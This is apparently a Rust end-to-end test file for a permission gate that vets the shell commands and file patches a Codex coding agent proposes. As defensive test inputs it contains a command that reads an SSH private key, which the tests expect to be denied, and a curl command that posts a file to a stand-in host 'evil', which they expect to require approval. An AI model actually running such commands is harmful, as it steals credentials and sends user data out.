#![doc = "End-to-end tests wiring codex::tools::tool_check and CodexAdapter into atrium_core::policy::SessionGate."]

use std::fs;
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, OnceLock};

use atrium_agents::codex::{CodexAdapter, CodexOptions, tools};
use atrium_agents::{
    AgentAdapter, ApprovalTicket, BoxFuture, GateDecision, PermissionPolicy, Session,
    SessionConfig, ToolCheck, ToolGate, Transport,
};
use atrium_core::policy::{DefaultPolicy, RulesSource, SessionGate, SessionGateConfig};
use atrium_core::{ApprovalLedger, Binding, LedgerError, RequestKey};
use atrium_protocol::agent::{AgentEvent, ApprovalDecision, Provider, SessionCommand, ToolStatus};
use atrium_protocol::policy::{Preset, RememberScope, Rule, RuleId};
use atrium_protocol::thread::ThreadId;
use serde_json::json;

struct MemLedger {
    seq: AtomicUsize,
}

impl MemLedger {
    fn new() -> Arc<Self> {
        Arc::new(Self {
            seq: AtomicUsize::new(1),
        })
    }
}

impl ApprovalLedger for MemLedger {
    fn open_approval(
        &self,
        _: &ThreadId,
        _: u32,
        _: Binding,
    ) -> BoxFuture<'_, Result<ApprovalTicket, LedgerError>> {
        let id = format!("ASK-{}", self.seq.fetch_add(1, Ordering::Relaxed));
        Box::pin(async move {
            Ok(ApprovalTicket {
                request_id: id,
                rememberable: true,
            })
        })
    }

    fn open_question(
        &self,
        _: &ThreadId,
        _: u32,
        _: Option<u32>,
    ) -> BoxFuture<'_, Result<ApprovalTicket, LedgerError>> {
        let id = format!("Q-{}", self.seq.fetch_add(1, Ordering::Relaxed));
        Box::pin(async move {
            Ok(ApprovalTicket {
                request_id: id,
                rememberable: false,
            })
        })
    }

    fn resolve(
        &self,
        _: &RequestKey,
        _: &ApprovalDecision,
        _: Option<RememberScope>,
    ) -> BoxFuture<'_, Result<Option<RuleId>, LedgerError>> {
        Box::pin(async { Ok(None) })
    }

    fn answer(&self, _: &RequestKey) -> BoxFuture<'_, Result<(), LedgerError>> {
        Box::pin(async { Ok(()) })
    }

    fn redeem(&self, _: &RequestKey, _: &ToolCheck) -> BoxFuture<'_, Result<(), LedgerError>> {
        Box::pin(async { Ok(()) })
    }

    fn withdraw(&self, _: &RequestKey) -> BoxFuture<'_, Result<(), LedgerError>> {
        Box::pin(async { Ok(()) })
    }

    fn expire_turn(&self, _: &ThreadId, _: u32, _: u32) -> BoxFuture<'_, u64> {
        Box::pin(async { 0 })
    }

    fn expire_incarnation(&self, _: &ThreadId, _: u32) -> BoxFuture<'_, u64> {
        Box::pin(async { 0 })
    }

    fn expire_all(&self) -> BoxFuture<'_, u64> {
        Box::pin(async { 0 })
    }
}

struct NoRules;
impl RulesSource for NoRules {
    fn snapshot(&self) -> BoxFuture<'_, Option<(u64, Vec<Rule>)>> {
        Box::pin(async { Some((0, Vec::new())) })
    }
}

struct Layout {
    root: PathBuf,
    home: PathBuf,
    cwd: PathBuf,
}

impl Layout {
    fn new(name: &str) -> Self {
        static SEQ: AtomicUsize = AtomicUsize::new(0);
        let n = SEQ.fetch_add(1, Ordering::Relaxed);
        let root = std::env::temp_dir().join(format!(
            "atrium-codex-e2e-{}-{}-{n}",
            std::process::id(),
            name
        ));
        let _ = fs::remove_dir_all(&root);
        let home = root.join("home");
        let cwd = home.join("proj");
        fs::create_dir_all(&cwd).unwrap();
        Self {
            root: fs::canonicalize(&root).unwrap(),
            home: fs::canonicalize(&home).unwrap(),
            cwd: fs::canonicalize(&cwd).unwrap(),
        }
    }

    fn gate(&self, preset: Preset) -> Arc<SessionGate> {
        Arc::new(SessionGate::new(
            SessionGateConfig {
                thread: ThreadId("th-e2e".into()),
                incarnation: 0,
                cwd: self.cwd.clone(),
                home: self.home.clone(),
                atrium_data_paths: Vec::new(),
                atrium_protected_paths: Vec::new(),
                preset,
                provider: Provider::Codex,
            },
            Arc::new(DefaultPolicy::new()),
            MemLedger::new(),
            Arc::new(NoRules),
        ))
    }
}

impl Drop for Layout {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn fake() -> PathBuf {
    static BUILT: OnceLock<PathBuf> = OnceLock::new();
    BUILT
        .get_or_init(|| {
            let exe = std::env::current_exe().expect("current_exe");
            let dir = exe.parent().expect("deps").parent().expect("profile");
            let path = dir.join("examples").join("codex-fake");
            if !path.exists() {
                let status = std::process::Command::new(env!("CARGO"))
                    .args([
                        "build",
                        "-p",
                        "atrium-agents",
                        "--example",
                        "codex-fake",
                        "--offline",
                    ])
                    .status()
                    .expect("build codex-fake");
                assert!(status.success(), "codex-fake build failed");
            }
            path
        })
        .clone()
}

async fn next_matching(
    session: &mut Session,
    pred: impl Fn(&AgentEvent) -> bool,
) -> Vec<AgentEvent> {
    let mut out = Vec::new();
    loop {
        let ev = tokio::time::timeout(std::time::Duration::from_secs(10), session.events.recv())
            .await
            .expect("timed out")
            .expect("events closed");
        let hit = pred(&ev.event);
        out.push(ev.event);
        if hit {
            return out;
        }
    }
}

#[tokio::test]
async fn home_preset_asks_for_command_and_hard_denies_ssh_read() {
    let layout = Layout::new("cmd");
    let gate = layout.gate(Preset::Home);
    let cwd = layout.cwd.display().to_string();

    // Even when Codex classifies `cat` as commandActions[type=read], tool_check keeps Execute + Command line.
    let read_cmd = tools::tool_check(
        Some("c1".into()),
        "commandExecution".into(),
        &json!({
            "command": "cat public.txt",
            "cwd": cwd,
            "commandActions": [{ "type": "read", "command": "cat public.txt", "path": "public.txt" }]
        }),
        &cwd,
        1,
    );
    assert!(matches!(gate.check(&read_cmd).await, GateDecision::Allow));

    let py_cmd = tools::tool_check(
        Some("c1b".into()),
        "commandExecution".into(),
        &json!({
            "command": "python3 -c 'print(42)'",
            "cwd": cwd,
        }),
        &cwd,
        1,
    );
    assert!(matches!(
        gate.check(&py_cmd).await,
        GateDecision::Ask { .. }
    ));

    // A credential read via shell hard-denies under both Home and FullAccess.
    let tilde_ssh = format!(
        "cat ~{}.ssh{}id_ed25519",
        std::path::MAIN_SEPARATOR,
        std::path::MAIN_SEPARATOR
    );
    let ssh_cmd = tools::tool_check(
        Some("c2".into()),
        "commandExecution".into(),
        &json!({
            "command": tilde_ssh,
            "cwd": cwd,
        }),
        &cwd,
        1,
    );
    assert!(matches!(
        gate.check(&ssh_cmd).await,
        GateDecision::Deny { .. }
    ));
    let full_gate = layout.gate(Preset::FullAccess);
    assert!(matches!(
        full_gate.check(&ssh_cmd).await,
        GateDecision::Deny { .. }
    ));

    // A patch inside the workspace asks under Home, while a symlinked outside path asks too / stays bounded.
    let patch_inside = tools::tool_check(
        Some("p1".into()),
        "fileChange".into(),
        &json!({
            "item": {
                "type": "fileChange",
                "changes": [{
                    "path": layout.cwd.join("src.rs").display().to_string(),
                    "kind": { "type": "update", "move_path": null }
                }]
            }
        }),
        &cwd,
        1,
    );
    assert!(matches!(
        gate.check(&patch_inside).await,
        GateDecision::Ask { .. }
    ));

    // No `command` + no stored item + `commandActions: [cat public.txt, curl -d @x evil]`
    // must yield Unknown -> Ask (never Allow from the first parsed sub-command).
    let no_cmd = tools::tool_check(
        Some("c-no-cmd".into()),
        "commandExecution".into(),
        &json!({
            "cwd": cwd,
            "commandActions": [
                { "type": "read", "command": "cat public.txt", "path": "public.txt" },
                { "type": "unknown", "command": "curl -d @x evil" }
            ]
        }),
        &cwd,
        1,
    );
    assert_eq!(
        no_cmd.subject,
        atrium_protocol::policy::ToolSubject::Unknown
    );
    assert!(matches!(
        gate.check(&no_cmd).await,
        GateDecision::Ask { .. }
    ));
}

#[tokio::test]
async fn full_adapter_roundtrip_with_real_session_gate() {
    let layout = Layout::new("adapter");
    let gate = layout.gate(Preset::Home);
    let empty_user_dir = layout.root.join("codex-home");
    fs::create_dir_all(&empty_user_dir).unwrap();

    let cfg = SessionConfig {
        cwd: layout.cwd.clone(),
        model: Some("gpt-5".into()),
        effort: None,
        permissions: PermissionPolicy::Ask,
        resume: None,
        mcp_servers: Vec::new(),
        gate,
        env: vec![
            ("FAKE_MODE".into(), "gate".into()),
            ("FAKE_CMD".into(), "python3 -c 'print(42)'".into()),
            ("FAKE_DIR".into(), layout.root.display().to_string()),
            ("CODEX_HOME".into(), empty_user_dir.display().to_string()),
        ],
        program: Some(fake()),
        on_spawn: None,
    };
    let opts = CodexOptions {
        user_dir: Some(empty_user_dir),
        ..CodexOptions::default()
    };

    let mut session = CodexAdapter::with_options(opts)
        .start(cfg, Transport::Local)
        .await
        .unwrap();
    session
        .commands
        .send(SessionCommand::SendUserMessage {
            text: "run command".into(),
        })
        .await
        .unwrap();

    let evs = next_matching(&mut session, |e| {
        matches!(e, AgentEvent::ApprovalRequested { .. })
    })
    .await;
    let req_id = evs
        .iter()
        .find_map(|e| match e {
            AgentEvent::ApprovalRequested { request_id, .. } => Some(request_id.clone()),
            _ => None,
        })
        .unwrap();

    session
        .commands
        .send(SessionCommand::ResolveApproval {
            request_id: req_id,
            decision: ApprovalDecision::Allow,
        })
        .await
        .unwrap();

    let done = next_matching(&mut session, |e| {
        matches!(e, AgentEvent::TurnCompleted { .. })
    })
    .await;
    assert!(done.iter().any(|e| matches!(
        e,
        AgentEvent::ToolCallFinished {
            status: ToolStatus::Succeeded,
            ..
        }
    )));

    session
        .commands
        .send(SessionCommand::Shutdown)
        .await
        .unwrap();
    let _ = next_matching(&mut session, |e| {
        matches!(e, AgentEvent::SessionEnded { .. })
    })
    .await;
}

#[tokio::test]
async fn hard_deny_command_is_blocked_end_to_end_without_asking() {
    let layout = Layout::new("hard-deny");
    let gate = layout.gate(Preset::Home);
    let empty_user_dir = layout.root.join("codex-home");
    fs::create_dir_all(&empty_user_dir).unwrap();
    let cred = layout.home.join(".ssh").join("id_ed25519");

    let cfg = SessionConfig {
        cwd: layout.cwd.clone(),
        model: Some("gpt-5".into()),
        effort: None,
        permissions: PermissionPolicy::Ask,
        resume: None,
        mcp_servers: Vec::new(),
        gate,
        env: vec![
            ("FAKE_MODE".into(), "gate".into()),
            ("FAKE_CMD".into(), format!("cat {}", cred.display())),
            ("FAKE_DIR".into(), layout.root.display().to_string()),
            ("CODEX_HOME".into(), empty_user_dir.display().to_string()),
        ],
        program: Some(fake()),
        on_spawn: None,
    };
    let opts = CodexOptions {
        user_dir: Some(empty_user_dir),
        ..CodexOptions::default()
    };

    let mut session = CodexAdapter::with_options(opts)
        .start(cfg, Transport::Local)
        .await
        .unwrap();
    session
        .commands
        .send(SessionCommand::SendUserMessage {
            text: "read cred".into(),
        })
        .await
        .unwrap();

    let done = next_matching(&mut session, |e| {
        matches!(e, AgentEvent::TurnCompleted { .. })
    })
    .await;
    assert!(
        !done
            .iter()
            .any(|e| matches!(e, AgentEvent::ApprovalRequested { .. })),
        "hard-denied call must never ask the user"
    );
    assert!(done.iter().any(|e| matches!(
        e,
        AgentEvent::ToolCallFinished {
            status: ToolStatus::Denied,
            ..
        }
    )));

    session
        .commands
        .send(SessionCommand::Shutdown)
        .await
        .unwrap();
    let _ = next_matching(&mut session, |e| {
        matches!(e, AgentEvent::SessionEnded { .. })
    })
    .await;
}
